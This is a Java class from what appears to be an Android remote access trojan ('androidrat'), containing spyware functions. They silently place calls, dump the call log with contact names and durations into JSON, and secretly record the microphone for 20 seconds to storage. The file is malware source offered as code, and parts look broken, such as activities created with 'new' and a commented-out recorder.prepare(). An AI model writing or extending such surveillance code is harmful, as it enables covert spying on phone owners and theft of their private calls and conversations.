package com.ot.androidrat;

import android.content.Intent;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class Voice {

    public int phoneCall(String phoneNo){
        try{
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + phoneNo));
            new MainService().startService(callIntent);
        }catch(Exception ex){
            return 1;
        }
        return 0;
    }

    public JSONObject viewCallLog() {
        JSONObject Calls = null;
        try {
            Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = new MainActivity().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            Log.i("Result", Calls.toString());
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
        return Calls;
    }

    public void recordMic(){
        MediaRecorder recorder;
        String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".mp3";
        File audiofile = new File(mPath);
        final String TAG = "MediaRecording";
        TimerTask stopRecording;



        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        //recorder.prepare();
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();

            }
        };

        new Timer().schedule(stopRecording, 20 * 1000);
    }


}
